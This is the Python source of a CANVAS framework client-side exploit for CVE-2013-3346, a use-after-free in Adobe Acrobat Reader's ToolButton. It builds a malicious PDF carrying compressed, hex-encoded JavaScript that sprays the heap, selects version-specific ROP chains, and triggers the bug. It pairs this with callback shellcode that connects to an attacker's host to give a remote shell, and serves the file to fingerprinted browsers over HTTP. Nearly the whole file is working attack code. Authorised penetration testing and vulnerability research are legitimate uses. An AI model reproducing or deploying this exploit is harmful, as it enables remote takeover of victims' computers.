#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside
from random import randint

import sys
import zlib
import canvasengine

from httpclientside import httpclientside
from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser


NAME                            = "acrobat_toolbutton"
DESCRIPTION                     = "Adobe Acrobat Reader ToolButton Use After Free"

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Adobe"
DOCUMENTATION["Repeatability"]  = ""
DOCUMENTATION["References"]     = "http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/ms-windows-local-privilege-escalation-zero-day-in-the-wild.html"
DOCUMENTATION["CVE Name"]       = "CVE-2013-3346"
DOCUMENTATION["CVE Url"]        = "http://www.adobe.com/support/security/bulletins/apsb13-15.html"
DOCUMENTATION["NOTES"]          = """
This exploit has been tested on:

- Windows XP SP3 EN Acrobat Reader 11.0.2/11.0.1/10.1.4/10.1.2/10.1.1/10.1.0

Vulnerable versions include:

<= 11.0.2
<= 10.1.6
<= 9.5.4
"""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [["Windows"]]
PROPERTY['VERSION']             = ["XP"]
PROPERTY['DELIVERY']            = 'HTTP'

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version        = 0
        self.name           = NAME
        # filename is used in the actual http server
        self.filename       = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + "00.pdf"

        # no refresh
        self.refresh_rate = 0

    def is_vulnerable(self, info_dict):
        ua = user_agent_parser.Parse(info_dict['user_agent'])

        if "Windows" not in ua['os']['family']:
            return 0

        major, minor, build, patch = self.getReaderVersions(info_dict)

        if not major:
            self.log("Reader not found")
            return 0

        if major == 11 and minor == 0 and build <= 2:
            return 100

        if major == 10 and minor <= 1 and build <= 6:
            return 100

        if major == 9 and minor <= 5 and build <= 4:
            self.log("Reader <= 9.5.4 is vulnerable but currently not supported")
            return 0

    def io_def(self, id):
        return "%d 0 obj \n" % id

    def io_ref(self, id):
        return "%d 0 R" % id

    def random_non_ascii_string(self, length):
        result = ""
        for i in range(length):
            result += chr(randint(0, 127) + 128)

        return result

    def ascii_hex_encode(self, str):
        result = ""
        whitespace = ""
        for b in str:
            result += whitespace + "%02x" % ord(b)
            whitespace = " " * (randint(0, 2) + 1)

        result += ">"

        return result

    def gen_pdf(self):
        rop_10    = urluencode(self.gen_rop_10_xpsp3())
        rop_11    = urluencode(self.gen_rop_11_xpsp3())
        shellcode = urluencode(self.shellcode)

        js = """
function spray(payload, ret_addr) {
  var nops = unescape("%u0c0c%u0c0c");
  while (nops.length < 0xC000) nops += nops;

  var nops_block = nops.substring(0, 0xA000);
  var ret_block  = ret_addr;
  while (ret_block.length < 0x0c0c)
    ret_block += ret_block;

  var payload_block  = ret_block;
  payload_block     += payload;

  while (payload_block.length < 0x60000)
    payload_block += payload_block;

  var mem_blocks = new Array();
  for (i = 0; i < 0x400; i++)
    mem_blocks[i] = payload_block + "a";

  return;
}

var is_vulnerable = false;

""" + """

var shellcode = unescape("%s");
var sz = 0x370;
var ret_addr;
var rop_addr;
var rop;

var rop10 = unescape("%s");
var rop11 = unescape("%s");

""" % (shellcode, rop_10, rop_11) + """

var ver = app.viewerVersion;


if (ver >= 10.1 && ver <= 10.101) {
   rop = rop10;
   sz -= 0x14;
   rop_addr = unescape("%u4a88%u0c06");
   ret_addr = unescape("%ua8df%u4a82");
   is_vulnerable=true;
 }
else if (ver > 10.101 && ver < 11 && ver <= 10.106) {
  rop = rop10;
  sz += 0xc;
  rop_addr = unescape("%u4a88%u0c06");
  ret_addr = unescape("%ua8df%u4a82");
  is_vulnerable = true;
}
else if (ver >= 11 && ver <= 11.002) {
  rop = rop11;
  rop_addr = unescape("%u1e1c%u0c0c");
  ret_addr = unescape("%u8003%u4a84");
  is_vulnerable = true;
}

if (is_vulnerable) {
  var payload = rop + shellcode;
  spray(payload, ret_addr);

  var block1 = "";
  var block2 = "";

  if (sz != 0x370) {
    for (i = 0; i < 0x1c / 2; i++)
      block1 += unescape("%u4444");
  }

  block1 += rop_addr;
  var block2_len = sz - block1.length * 2;
  for (i = 0; i < block2_len / 2 - 1; i++)
    block2 += unescape("%u4545");

  var blocks = new Array();

  removeButtonFunc = function () {
    app.removeToolButton({
        cName: "aaa"
    });

    for (i = 0; i < 5; i++)
      blocks[i] = block1.concat(block2);
  }

  addButtonFunc = function () {
    app.addToolButton({
      cName: "child",
      cExec: "1",
      cEnable: "removeButtonFunc();"
    });
  }

  app.addToolButton({
    cName: "aaa",
    cExec: "1",
    cEnable: "addButtonFunc();"
  });
}
"""

        xref = []
        nl = "\n"
        endobj = "endobj\n"

        pdf = "%PDF-1.5\n"
        pdf += "%" + self.random_non_ascii_string(4) + nl

        # catalog
        xref.append(len(pdf))
        pdf += self.io_def(1) + "<<\n"
        pdf += "/Pages " + self.io_ref(2) + nl
        pdf += "/Type /Catalog\n"
        pdf += "/OpenAction " + self.io_ref(4) + "\n"

        # icucnv36.dll / icucnv40.dll
        pdf += "/AcroForm " + self.io_ref(6) + nl
        pdf += ">>\n"
        pdf += endobj

        # pages array
        xref.append(len(pdf))
        pdf += self.io_def(2) + "<<\n"
        pdf += "/Kids [" + self.io_ref(3) + "]\n"
        pdf += "/Count 1\n"
        pdf += "/Type /Pages\n"
        pdf += ">>\n"
        pdf += endobj

        # page 1
        xref.append(len(pdf))
        pdf += self.io_def(3) + "<<\n"
        pdf += "/Parent " + self.io_ref(2) + nl
        pdf += "/Type /Page\n"
        pdf += ">>\n" # end obj dict
        pdf += endobj

        # js action
        xref.append(len(pdf))
        pdf += self.io_def(4) + "<<"
        pdf += "/Type/Action/S/JavaScript/JS " + self.io_ref(5)
        pdf += ">>\n"
        pdf += endobj

        # js stream
        xref.append(len(pdf))
        compressed = zlib.compress(self.ascii_hex_encode(js))
        pdf += self.io_def(5) + "<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>\n" % len(compressed)
        pdf += "stream\n"
        pdf += compressed + "\n"
        pdf += "endstream\n"
        pdf += endobj

        # form object
        xref.append(len(pdf))
        pdf += self.io_def(6)
        pdf += "<</XFA " + self.io_ref(7) + ">>\n"
        pdf += endobj

        # form stream
        xfa = """<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/2.6/">
<present><pdf><interactive>1</interactive></pdf></present>
</config>
<template xmlns="http://www.xfa.org/schema/xfa-template/2.6/">
<subform name="form1" layout="tb" locale="en_US">
<pageSet></pageSet>
</subform></template></xdp:xdp>
"""

        xref.append(len(pdf))
        pdf += self.io_def(7) + "<</Length %s>>\n" % len(xfa)
        pdf += "stream\n"
        pdf += xfa + nl
        pdf += "endstream\n"
        pdf += endobj

        xref_pos = len(pdf)
        pdf += "xref\n"
        pdf += "0 %d\n" % (len(xref) + 1)
        pdf += "0000000000 65535 f\n"
        for i in xref:
            pdf += "%010d 00000 n\n" % i

        pdf += "trailer\n"
        pdf += "<</Size %d/Root " % (len(xref) + 1) + self.io_ref(1) + ">>\n"

        pdf += "startxref\n"
        pdf += "%d\n" % xref_pos

        pdf += "%%EOF\n"

        return pdf

    def gen_rop_10_xpsp3(self):
        base = 0x4a800000
        rop_gadgets = ""

        rop_gadgets += struct.pack('<L', base + 0x26015) # POP ECX # RET
        rop_gadgets += struct.pack('<L', base + 0x2e090) # push eax # pop esp # ret
        rop_gadgets += struct.pack('<L', base + 0x2007d) # pop eax # ret
        rop_gadgets += struct.pack('<L', base + 0x50038) # ptr to CreateFileMappingA()
        rop_gadgets += struct.pack('<L', base + 0x246d5) # call [eax] # ret
        rop_gadgets += struct.pack('<L', 0xffffffff) # HANDLE hFile
        rop_gadgets += struct.pack('<L', 0x00000000) # LPSECURITY_ATTRIBUTES lpAttributes
        rop_gadgets += struct.pack('<L', 0x00000040) # DWORD flProtect
        rop_gadgets += struct.pack('<L', 0x00000000) # DWORD dwMaximumSizeHigh
        rop_gadgets += struct.pack('<L', 0x00001000) # DWORD dwMaximumSizeHigh
        rop_gadgets += struct.pack('<L', 0x00000000) # LPCTSTR lpName
        rop_gadgets += struct.pack('<L', base + 0x05016) # pop edi # ret
        rop_gadgets += struct.pack('<L', base + 0x4420c) # pop ebp # pop ebx # pop ecx # ret
        rop_gadgets += struct.pack('<L', base + 0x14241) # pop ebx # ret
        rop_gadgets += struct.pack('<L', base + 0x2007d) # pop eax # ret
        rop_gadgets += struct.pack('<L', base + 0x26015) # pop ecx # ret
        rop_gadgets += struct.pack('<L', base + 0x50030) # ptr to MapViewOfFile()
        rop_gadgets += struct.pack('<L', base + 0x4b49d) # mov edx, ecx # ret
        rop_gadgets += struct.pack('<L', base + 0x26015) # pop ecx # ret
        rop_gadgets += struct.pack('<L', base + 0x246d5) # call [eax] # ret
        rop_gadgets += struct.pack('<L', base + 0x14197) # pushad # add al, 0 # ret
        rop_gadgets += struct.pack('<L', 0x00000026) # DWORD dwDesiredAccess
        rop_gadgets += struct.pack('<L', 0x00000000) # DWORD dwFileOffsetHigh
        rop_gadgets += struct.pack('<L', 0x00000000) # DWORD dwFileOffsetLow
        rop_gadgets += struct.pack('<L', 0x00000000) # SIZE_T dwNumberOfBytesToMap
        rop_gadgets += struct.pack('<L', base + 0x14013) # pop edi # pop esi # pop ebp # pop ebx # pop ecx # ret
        rop_gadgets += struct.pack('<L', base + 0x4e036) # jmp to IAT msvcr90!memcpy
        rop_gadgets += struct.pack('<L', base + 0x2a8df) # ret
        rop_gadgets += struct.pack('<L', 0x90909090) # rop nop
        rop_gadgets += struct.pack('<L', len(self.shellcode)) # memcpy length
        rop_gadgets += struct.pack('<L', 0x90909090) # rop nop
        rop_gadgets += struct.pack('<L', base + 0x18b31) # xchg eax, ebp # ret
        rop_gadgets += struct.pack('<L', base + 0x14197) # pushad # add al, 0 # ret

        return rop_gadgets

    def gen_rop_11_xpsp3(self):
        base = 0x4a800000
        rop_gadgets = ""

        rop_gadgets += struct.pack('<L', base + 0x5822c) # POP ECX # RET
        rop_gadgets += struct.pack('<L', base + 0x2f129) # push eax # pop esp # ret
        rop_gadgets += struct.pack('<L', base + 0x5597f) # pop eax # ret
        rop_gadgets += struct.pack('<L', base + 0x66038) # ptr to CreateFileMappingA()
        rop_gadgets += struct.pack('<L', base + 0x3f1d5) # call [eax] # ret
        rop_gadgets += struct.pack('<L', 0xffffffff) # HANDLE hFile
        rop_gadgets += struct.pack('<L', 0x00000000) # LPSECURITY_ATTRIBUTES lpAttributes
        rop_gadgets += struct.pack('<L', 0x00000040) # DWORD flProtect
        rop_gadgets += struct.pack('<L', 0x00000000) # DWORD dwMaximumSizeHigh
        rop_gadgets += struct.pack('<L', 0x00001000) # DWORD dwMaximumSizeHigh
        rop_gadgets += struct.pack('<L', 0x00000000) # LPCTSTR lpName
        rop_gadgets += struct.pack('<L', base + 0x55093) # pop edi # ret
        rop_gadgets += struct.pack('<L', 0x90909090) # rop nop
        rop_gadgets += struct.pack('<L', base + 0x50030) # pop ebx # pop esi # pop ebp # ret
        rop_gadgets += struct.pack('<L', base + 0x5597f) # pop eax # ret
        rop_gadgets += struct.pack('<L', base + 0x50031) # pop esi # pop ebp # ret
        rop_gadgets += struct.pack('<L', 0x90909090) # rop nop
        rop_gadgets += struct.pack('<L', base + 0x5822c) # pop ecx # ret
        rop_gadgets += struct.pack('<L', base + 0x3f1d5) # call [eax] # ret
        rop_gadgets += struct.pack('<L', base + 0x5d4f8) # pop edx # ret
        rop_gadgets += struct.pack('<L', base + 0x66030) # ptr to MapViewOfFile()
        rop_gadgets += struct.pack('<L', base + 0x14864) # pushad # add al, 0 # pop ebp # ret
        rop_gadgets += struct.pack('<L', 0x00000026) # DWORD dwDesiredAccess
        rop_gadgets += struct.pack('<L', 0x00000000) # DWORD dwFileOffsetHigh
        rop_gadgets += struct.pack('<L', 0x00000000) # DWORD dwFileOffsetLow
        rop_gadgets += struct.pack('<L', 0x00000000) # SIZE_T dwNumberOfBytesToMap
        rop_gadgets += struct.pack('<L', base + 0x14856) # pop edi # pop esi # pop ebp # ret
        rop_gadgets += struct.pack('<L', base + 0x505a0) # memcpy address
        rop_gadgets += struct.pack('<L', base + 0x60bc4) # call eax # ret
        rop_gadgets += struct.pack('<L', base + 0x505a0) # memcpy address
        rop_gadgets += struct.pack('<L', base + 0x1c376) # xchg eax, ebp # ret
        rop_gadgets += struct.pack('<L', base + 0x463d0) # pop ebx # ret
        rop_gadgets += struct.pack('<L', len(self.shellcode)) # memcpy length
        rop_gadgets += struct.pack('<L', base + 0x5d4f8) # pop edx # ret
        rop_gadgets += struct.pack('<L', base + 0x5d4f8) # pop edx # ret
        rop_gadgets += struct.pack('<L', base + 0x14864) # pushad # add al, 0 # pop ebp # ret

        return rop_gadgets

    def create_shellcode(self):
        # we need to avoid using injectToSelf since CreateProcess() is failing
        host = self.callback.ip
        port = self.callback.port

        import shellcode.standalone.windows.payloads as payloads
        p   = payloads.payloads()

        if self.HTTPMOSDEF or self.useSSLMOSDEF:
            self.log("Shellcode calling back to %s:%d"%(host, port))
            proxy_payload = ''

            sc  = p.http_proxy(host, port, SSL=self.useSSLMOSDEF)
            proxy_payload = p.assemble(sc)

            self.log('HTTP MOSDEF payload size: %d bytes' % len(proxy_payload))
            self.log('HTTP MOSDEF callback IP: %s PORT: %s SSL: %s' % (host, port, self.useSSLMOSDEF))

            self.shellcode = proxy_payload
            if len(self.shellcode) % 2:
                self.shellcode += 'A'
        else:
            sc = p.callback(host, port, universal=True)
            payload = p.assemble(sc)

            self.shellcode = payload

    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()

        if self.plugin_info:
            self.log("We got a plugin info for this target - thanks clientd!")
            info_dict   = self.plugin_info
            user_agent  = info_dict['user_agent']

            if self.is_vulnerable(info_dict):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None
        else:
            user_agent = clientheader.getStrValue(['User-Agent'])

        if clientheader.URL.endswith(self.filename):
            self.log('Serving PDF')

            self.create_shellcode()
            pdf = self.gen_pdf()

            b.setBody(pdf)
            h.addHeader('Content-Type','application/pdf')

        elif clientheader.URL.count("exit"):
            self.log('Max retries reached. Exploit failed.')
            h.status='302'
            h.addHeader('Location',"http://www.google.com")
            h.addHeader('Content-Type','text/html')
            return h, b

        else:
            self.log('Redirecting to self')
            h.status='302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type','text/html')

        return h, b

    def run(self):
        self.create_shellcode()
        pdf = self.gen_pdf()

        self.log('Opening %s for output' % (self.filename))

        fd = file(self.filename, 'wb+')
        fd.write(pdf)
        fd.close()

        self.log('Wrote to %s' % (self.filename))

        return 1

if __name__ == '__main__':
    exp = theexploit()
    ret = standard_callback_commandline(exp)
    if ret not in [0, 1, None]:
        ret.interact()
